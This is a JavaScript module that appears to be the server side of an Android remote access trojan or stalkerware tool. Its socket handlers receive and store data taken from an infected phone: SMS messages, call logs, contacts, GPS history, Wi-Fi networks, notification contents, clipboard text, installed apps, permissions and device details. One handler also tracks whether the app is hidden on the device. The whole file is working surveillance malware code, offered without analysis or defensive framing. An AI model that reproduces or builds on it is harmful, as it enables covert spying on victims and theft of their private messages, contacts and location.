// Data Handlers Module

import config from '../../config/config.js';
import { logger } from '../../logs/logs.js';

const setupDataHandlers = (socket, cdb, id, disconnectHandler) => {
    if (!socket || !cdb) return;

    // SMS Handler - Android sends { smslist: [...], total: N }
    socket.on('0xSM', (data) => {
        try {
            if (data && data.smslist) {
                const list = Array.isArray(data.smslist) ? data.smslist : [];
                cdb.set('sms', list).write();
                logger.dataReceived(id, 'SMS', list.length);
            } else if (data && data.type === 'sent') {
                logger.info(`SMS sent from ${id}`, 'client');
            } else if (data && data.success !== undefined) {
                logger.info(`SMS send result: ${data.success ? 'success' : 'failed'}`, 'client');
            }
            cdb.set('lastUpdated', new Date().toISOString()).write();
        } catch (e) {
            logger.systemError('SMS handler error', e);
        }
    });

    // Calls Handler - Android sends { callsList: [...], total: N }
    socket.on('0xCL', (data) => {
        try {
            if (data && data.callsList) {
                const list = Array.isArray(data.callsList) ? data.callsList : [];
                cdb.set('calls', list).write();
                logger.dataReceived(id, 'Calls', list.length);
            }
            cdb.set('lastUpdated', new Date().toISOString()).write();
        } catch (e) {
            logger.systemError('Calls handler error', e);
        }
    });

    // Contacts Handler - Android sends { contactsList: [...], total: N }
    socket.on('0xCO', (data) => {
        try {
            if (data && data.contactsList) {
                const list = Array.isArray(data.contactsList) ? data.contactsList : [];
                cdb.set('contacts', list).write();
                logger.dataReceived(id, 'Contacts', list.length);
            }
            cdb.set('lastUpdated', new Date().toISOString()).write();
        } catch (e) {
            logger.systemError('Contacts handler error', e);
        }
    });

    // GPS Handler - Android sends location object with timestamp
    socket.on('0xLO', (data) => {
        try {
            if (data && data.latitude !== undefined) {
                const gps = cdb.get('gps').value() || [];
                const timestamp = data.time || data.timestamp || Date.now();
                gps.push({
                    latitude: data.latitude,
                    longitude: data.longitude,
                    accuracy: data.accuracy || 0,
                    altitude: data.altitude || 0,
                    speed: data.speed || 0,
                    provider: data.provider || 'unknown',
                    time: typeof timestamp === 'number' ? new Date(timestamp).toISOString() : timestamp
                });
                
                if (gps.length > config.limits.maxGpsHistory) {
                    cdb.set('gps', gps.slice(-config.limits.maxGpsHistory)).write();
                } else {
                    cdb.set('gps', gps).write();
                }
                logger.dataReceived(id, 'GPS');
            } else if (data && data.enabled === false) {
                // Handle location unavailable response
                logger.info(`Location unavailable for ${id}`, 'client');
            }
            cdb.set('lastUpdated', new Date().toISOString()).write();
        } catch (e) {
            logger.systemError('GPS handler error', e);
        }
    });

    // WiFi Handler - Android sends { networks: [...], total: N } or { error: "..." }
    socket.on('0xWI', (data) => {
        try {
            if (data && data.networks) {
                const list = Array.isArray(data.networks) ? data.networks : [];
                cdb.set('wifi', list).write();
                cdb.set('wifiError', null).write();
                logger.dataReceived(id, 'WiFi', list.length);
            } else if (data && data.error) {
                cdb.set('wifi', []).write();
                cdb.set('wifiError', data.error).write();
                logger.info(`WiFi scan error for ${id}: ${data.error}`, 'client');
            }
            cdb.set('lastUpdated', new Date().toISOString()).write();
        } catch (e) {
            logger.systemError('WiFi handler error', e);
        }
    });

    // Notifications Handler - Android sends notification data directly or wrapped
    socket.on('0xNO', (data) => {
        try {
            if (data && data.enabled !== undefined) {
                // Status response from device
                cdb.set('notificationEnabled', data.enabled).write();
                cdb.set('notificationConnected', data.connected || false).write();
                logger.info(`Notifications ${data.enabled ? 'enabled' : 'disabled'} for ${id}`, 'client');
            } else if (data && data.removed) {
                // Notification removed event
                logger.info(`Notification removed from ${id}: ${data.packageName}`, 'client');
            } else if (data && (data.title || data.content || data.appName)) {
                // Direct notification data from Android (main format)
                const notifications = cdb.get('notifications').value() || [];
                const timestamp = data.timestamp || data.postTime || Date.now();
                notifications.push({
                    appName: data.appName || data.app || data.package || 'Unknown',
                    title: data.title || '',
                    content: data.content || data.text || data.body || '',
                    time: typeof timestamp === 'number' ? new Date(timestamp).toISOString() : timestamp,
                    id: data.id,
                    tag: data.tag,
                    ongoing: data.ongoing,
                    clearable: data.clearable,
                    category: data.category,
                    initial: data.initial
                });
                
                if (notifications.length > config.limits.maxNotifications) {
                    cdb.set('notifications', notifications.slice(-config.limits.maxNotifications)).write();
                } else {
                    cdb.set('notifications', notifications).write();
                }
                logger.dataReceived(id, 'Notification');
            } else if (data && data.notification) {
                // Legacy wrapped format support
                const notifications = cdb.get('notifications').value() || [];
                const notifData = data.notification;
                const timestamp = notifData.time || notifData.timestamp || Date.now();
                notifications.push({
                    appName: notifData.app || notifData.package || 'Unknown',
                    title: notifData.title || '',
                    content: notifData.text || notifData.body || notifData.content || '',
                    time: typeof timestamp === 'number' ? new Date(timestamp).toISOString() : timestamp
                });
                
                if (notifications.length > config.limits.maxNotifications) {
                    cdb.set('notifications', notifications.slice(-config.limits.maxNotifications)).write();
                } else {
                    cdb.set('notifications', notifications).write();
                }
                logger.dataReceived(id, 'Notification');
            }
            cdb.set('lastUpdated', new Date().toISOString()).write();
        } catch (e) {
            logger.systemError('Notifications handler error', e);
        }
    });

    // Clipboard Handler - Android sends { text: "...", timestamp: N }
    socket.on('0xCB', (data) => {
        try {
            if (data && data.text !== undefined) {
                const clipboard = cdb.get('clipboard').value() || [];
                const timestamp = data.time || data.timestamp || Date.now();
                clipboard.push({
                    text: data.text,
                    length: data.length || data.text.length,
                    label: data.label || '',
                    mimeType: data.mimeType || '',
                    time: typeof timestamp === 'number' ? new Date(timestamp).toISOString() : timestamp
                });
                
                if (clipboard.length > config.limits.maxClipboardHistory) {
                    cdb.set('clipboard', clipboard.slice(-config.limits.maxClipboardHistory)).write();
                } else {
                    cdb.set('clipboard', clipboard).write();
                }
                logger.dataReceived(id, 'Clipboard');
            }
            cdb.set('lastUpdated', new Date().toISOString()).write();
        } catch (e) {
            logger.systemError('Clipboard handler error', e);
        }
    });

    // Apps Handler - Android sends { apps: [...], total: N }
    socket.on('0xIN', (data) => {
        try {
            if (data && data.apps) {
                const list = Array.isArray(data.apps) ? data.apps : [];
                cdb.set('apps', list).write();
                logger.dataReceived(id, 'Apps', list.length);
            }
            cdb.set('lastUpdated', new Date().toISOString()).write();
        } catch (e) {
            logger.systemError('Apps handler error', e);
        }
    });

    // Permissions Handler - Android sends array or object
    socket.on('0xPM', (data) => {
        try {
            if (Array.isArray(data)) {
                cdb.set('permissions', data).write();
                logger.dataReceived(id, 'Permissions', data.length);
            } else if (data && data.permissions) {
                const list = Array.isArray(data.permissions) ? data.permissions : [];
                cdb.set('permissions', list).write();
                logger.dataReceived(id, 'Permissions', list.length);
            }
            cdb.set('lastUpdated', new Date().toISOString()).write();
        } catch (e) {
            logger.systemError('Permissions handler error', e);
        }
    });

    // Permission Check Handler
    socket.on('0xGP', (data) => {
        try {
            if (data && data.permission) {
                const permissions = cdb.get('permissions').value() || [];
                const idx = permissions.findIndex(p => p.permission === data.permission);
                
                if (idx >= 0) {
                    permissions[idx].allowed = data.allowed;
                } else {
                    permissions.push({ permission: data.permission, allowed: data.allowed });
                }
                
                cdb.set('permissions', permissions).write();
                logger.dataReceived(id, `Permission ${data.permission}`);
            }
            cdb.set('lastUpdated', new Date().toISOString()).write();
        } catch (e) {
            logger.systemError('Permission check handler error', e);
        }
    });

    // Device Info Handler
    socket.on('0xIF', (data) => {
        try {
            if (data) {
                cdb.set('deviceInfo', data).write();
                cdb.set('device', {
                    model: data.model || data.device || 'Unknown',
                    brand: data.brand || data.manufacturer || 'Unknown',
                    version: data.version || data.androidVersion || 'Unknown',
                    sdk: data.sdkLevel || data.sdk,
                    board: data.board,
                    bootloader: data.bootloader,
                    cpu: data.hardware,
                    memory: data.memory,
                    storage: data.storage
                }).write();
                logger.dataReceived(id, 'DeviceInfo');
            }
            cdb.set('lastUpdated', new Date().toISOString()).write();
        } catch (e) {
            logger.systemError('DeviceInfo handler error', e);
        }
    });

    // Fason Manager Handler
    socket.on('0xFM', (data) => {
        try {
            if (data && data.hidden !== undefined) {
                cdb.set('fasonHidden', data.hidden).write();
                cdb.set('state.fasonHidden', data.hidden).write();
                logger.info(`App ${data.hidden ? 'hidden' : 'visible'} for ${id}`, 'client');
            }
            cdb.set('lastUpdated', new Date().toISOString()).write();
        } catch (e) {
            logger.systemError('FasonManager handler error', e);
        }
    });
};

export { setupDataHandlers };
